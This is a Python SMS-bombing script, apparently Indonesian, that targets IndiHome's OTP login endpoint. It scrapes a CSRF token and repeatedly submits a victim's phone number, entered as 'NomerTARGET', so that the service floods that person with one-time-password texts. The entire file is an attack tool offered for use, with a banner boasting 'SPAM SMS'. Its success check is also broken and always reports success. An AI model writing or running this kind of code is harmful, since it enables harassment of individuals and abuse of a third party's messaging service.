import requests, sys, re
from concurrent.futures import ThreadPoolExecutor
#MAURECODELU?

def gas(no):
        s = requests.Session()
        url = "https://www.indihome.co.id/verifikasi-layanan/login-otp"
        req = s.get(url).text
        token = re.findall(r"name=\"_token\" value=\"(.*?)\"", req)[0]

        data = {
        "_token":token,
        "msisdn":no
        }

        spam = s.post(url, data=data).text

        return spam

def main(cnt, no):
        jml = 0
        with ThreadPoolExecutor(max_workers=2) as e:
                futures = []
                for x in range(int(cnt)):
                        futures.append(e.submit(gas, no))
                for i, future in enumerate(futures):
                        jml += 1
                        spam = future.result()
                        if "Gagal!" or "dikirim" in spam:
                                print(f"[{jml}] \033[1;33mSpammedsSUCCES√ {no}")
                        else:
                                print("* ERROR *")
                                sys.exit()
        print("")

if __name__ == '__main__':
        try:
                print("""\033[1m

\033[1;95m
 ______  _______ __   _ _____ _______ _______ _____ __   _
 |_____] |______ | \  |   |   |_____| |  |  |   |   | \  |
 |_____] |______ |  \_| __|   |     | |  |  | __|__ |  \_|
                                                          
SPAM              SMS             BY            BENJAMIN
ex: 08xxxxx10\033[0m
        """)

                no = input("\033[1;95mNomerTARGET    : ")
                if(no.isdigit()):
                        pass
                else:
                        print("Check your number phone!")
                        sys.exit()

                if len(no) < 9:
                        print("Check your number phone!")
                        sys.exit()

                cnt = input("BANYAK SPAM : ")
                if bool(cnt.isdigit()) == 0:
                        print("Check your count!")
                        sys.exit()
                else:
                        print("")
                        main(cnt, no)
        except(KeyboardInterrupt, EOFError):
                print("\n")
                sys.exit()
